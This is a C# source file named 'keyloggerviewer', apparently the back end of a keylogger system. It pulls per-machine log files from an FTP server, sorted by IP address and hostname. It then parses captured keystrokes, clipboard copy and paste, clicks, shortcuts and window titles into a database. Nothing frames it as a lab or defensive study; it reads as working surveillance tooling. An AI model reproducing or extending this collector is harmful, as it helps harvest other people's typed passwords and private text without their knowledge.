using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;

namespace keyloggerviewer
{
    public class DataAdd
    {
        public static string server = "ftp://127.0.0.1/";
        public static string username = "test";
        public static string password = "";
        public static void ConnectionServer()
        {

            FtpWebRequest request;
		
            request = (FtpWebRequest)WebRequest.Create(server);
            request.Credentials = new NetworkCredential(username, password);
            request.Method = WebRequestMethods.Ftp.ListDirectory;
            FtpWebResponse response = (FtpWebResponse)request.GetResponse();

            Stream responseStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(responseStream);
            string[] b = reader.ReadToEnd().Split("\n");
            Console.WriteLine(b);
            reader.Close();
            response.Close();
            foreach (string ip in b)
            {
                string[] filename = getHostName(ip);
                foreach (string name in filename)
                {
                    if (name.Contains("/"))
                    {
                        Host h = getHostData(name);
                        Console.WriteLine(h.ToString());
                        Program.connection.insertLogData(h);
                        //Program.connection.insertLogData(h);
                    }
                }
                
            }
            
        }

        public static string[] getHostName(string ip)
        {
            FtpWebRequest request;
            request = (FtpWebRequest)WebRequest.Create(server + ip);
            request.Credentials = new NetworkCredential(username, password);
            request.Method = WebRequestMethods.Ftp.ListDirectory;
            FtpWebResponse response = (FtpWebResponse)request.GetResponse();

            Stream responseStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(responseStream);
            string[] fileList = reader.ReadToEnd().Split("\n");
            return fileList;
        }

        public static Host getHostData(string address)
        {
            Console.WriteLine(address);
            string[] names = address.Split("/");
            string ip = names[0];
            string hostName = names[1].Split(".")[0];
            Host host = new Host(ip, hostName);
            FtpWebRequest request;
            request = (FtpWebRequest)WebRequest.Create(server + address);
            request.Credentials = new NetworkCredential(username, password);
            request.Method = WebRequestMethods.Ftp.DownloadFile;
            FtpWebResponse response = (FtpWebResponse)request.GetResponse();

            Stream responseStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(responseStream);
            while (!reader.EndOfStream)
            {
                string line = reader.ReadLine();
                string[] value = line.Split("\\:\\");
                DateTime dateTime = DateTime.Parse(value[0]);
                string window = value[1];
                string data = value[2];
                Regex r = new Regex("(\\\\\\\\)*`");
                bool cmd = false;
                int lastIndex = 0;
                string logD = "";
                foreach (Match b in r.Matches(data))
                {
                    //Console.WriteLine(b.Index);
                    logD = data.Substring(lastIndex, b.Index - lastIndex);
                    if (!cmd)
                    {
                        if (logD != "")
                            host.addLog(new Log(dateTime, dateTime, "text", window, logD));
                    }
                    else
                    {
                        if (logD == "Control+C")
                        {
                            host.addLog(new Log(dateTime, dateTime, "copy", window));
                        } else if (logD == "Control+V")
                        {
                            host.addLog(new Log(dateTime, dateTime, "paste", window));
                        } else if (logD == "Click")
                        {
                            host.addLog(new Log(dateTime, dateTime, "click", window));
                        } else if (logD.Contains("+"))
                        {
                            host.addLog(new Log(dateTime, dateTime, "shortcut", window, logD));
                        }
                        else
                        {
                            host.addLog(new Log(dateTime, dateTime, "keypress", window, logD));
                        }
                    }
                    lastIndex = b.Index + 1;
                    cmd = !cmd;
                    
                }
                // foreach (string d in b)
                // {
                //     Console.WriteLine(d);
                //     Console.WriteLine("aze");
                // }
                Console.WriteLine(window);
                Console.WriteLine(dateTime);
                Console.WriteLine(value[2]);

                Console.WriteLine(line);
            }
            return host;
        }
    }
}